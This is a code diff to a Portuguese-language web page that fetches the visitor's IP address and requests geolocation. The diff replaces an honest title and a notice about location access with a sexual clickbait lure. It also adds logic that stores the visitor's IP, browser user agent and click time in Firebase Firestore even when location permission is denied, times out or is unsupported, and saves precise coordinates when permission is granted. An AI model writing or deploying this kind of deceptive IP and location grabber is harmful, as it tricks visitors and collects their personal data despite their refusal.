@@ -117,8 +117,8 @@ button {
 <body>
 
 <div id="startScreen">
-  <h1>Mostrar IP e localização</h1>
-  <p>Ao clicar, será pedido acesso à localização.</p>
+  <h1>site dos fixes onde tem mamas grandes</h1>
+  <p>clique a qui se for fixe.</p>
   <button id="openBtn">Abrir</button>
 </div>
 
@@ -164,21 +164,16 @@ let cachedIP = "UNKNOWN";
 let effectStarted = false;
 let lastClickTime = null;
 
-/* Buscar IP logo ao carregar */
 async function preloadIP() {
   try {
     const res = await fetch("https://api.ipify.org?format=json");
     const data = await res.json();
     cachedIP = data.ip || "UNKNOWN";
-    if (effectStarted) {
-      text.textContent = cachedIP;
-    }
+    if (effectStarted) text.textContent = cachedIP;
     console.log("IP carregado:", cachedIP);
   } catch (error) {
     cachedIP = "ERROR";
-    if (effectStarted) {
-      text.textContent = cachedIP;
-    }
+    if (effectStarted) text.textContent = cachedIP;
     console.error("Erro ao obter IP:", error);
   }
 }
@@ -226,28 +221,47 @@ async function saveToFirestore(payload) {
 
     console.log("Guardado com sucesso. ID:", docRef.id);
 
-    locationText.textContent =
-      `Guardado às ${payload.clickedAtLocal} | IP ${payload.ip}`;
+    if (payload.latitude !== null && payload.longitude !== null) {
+      locationText.textContent =
+        `Guardado às ${payload.clickedAtLocal} | IP ${payload.ip} | com localização`;
+    } else {
+      locationText.textContent =
+        `Guardado às ${payload.clickedAtLocal} | IP ${payload.ip} | sem localização`;
+    }
   } catch (error) {
     console.error("Erro ao guardar no Firestore:", error);
     locationText.textContent = "Erro ao guardar no Firebase: " + error.message;
   }
 }
 
+async function saveIPOnly(reason = "location_unavailable") {
+  const clickDate = lastClickTime || new Date();
+
+  const payload = {
+    ip: cachedIP,
+    latitude: null,
+    longitude: null,
+    accuracy: null,
+    locationStatus: reason,
+    userAgent: navigator.userAgent,
+    clickedAtISO: clickDate.toISOString(),
+    clickedAtLocal: clickDate.toLocaleString("pt-PT")
+  };
+
+  await saveToFirestore(payload);
+}
+
 function requestLocationAndSave() {
   if (!navigator.geolocation) {
-    locationText.textContent = "Geolocalização não suportada neste browser.";
-    console.log("Geolocalização não suportada.");
+    locationText.textContent = "Geolocalização não suportada. A guardar só IP...";
+    saveIPOnly("geolocation_not_supported");
     return;
   }
 
   locationText.textContent = "A pedir permissão de localização...";
-  console.log("A pedir localização...");
 
   navigator.geolocation.getCurrentPosition(
     async (position) => {
-      console.log("Localização recebida:", position);
-
       const clickDate = lastClickTime || new Date();
 
       const payload = {
@@ -255,32 +269,37 @@ function requestLocationAndSave() {
         latitude: position.coords.latitude,
         longitude: position.coords.longitude,
         accuracy: position.coords.accuracy,
+        locationStatus: "granted",
         userAgent: navigator.userAgent,
         clickedAtISO: clickDate.toISOString(),
         clickedAtLocal: clickDate.toLocaleString("pt-PT")
       };
 
-      console.log("Payload:", payload);
       await saveToFirestore(payload);
-
       text.textContent = cachedIP;
     },
-    (error) => {
+    async (error) => {
       console.error("Erro ao obter localização:", error);
 
       switch (error.code) {
         case error.PERMISSION_DENIED:
-          locationText.textContent = "Permissão de localização negada.";
+          locationText.textContent = "Localização recusada. A guardar só IP...";
+          await saveIPOnly("permission_denied");
           break;
         case error.POSITION_UNAVAILABLE:
-          locationText.textContent = "Localização indisponível.";
+          locationText.textContent = "Localização indisponível. A guardar só IP...";
+          await saveIPOnly("position_unavailable");
           break;
         case error.TIMEOUT:
-          locationText.textContent = "Tempo de espera excedido.";
+          locationText.textContent = "Timeout da localização. A guardar só IP...";
+          await saveIPOnly("timeout");
           break;
         default:
-          locationText.textContent = "Erro ao obter localização.";
+          locationText.textContent = "Erro na localização. A guardar só IP...";
+          await saveIPOnly("unknown_error");
       }
+
+      text.textContent = cachedIP;
     },
     {
       enableHighAccuracy: true,
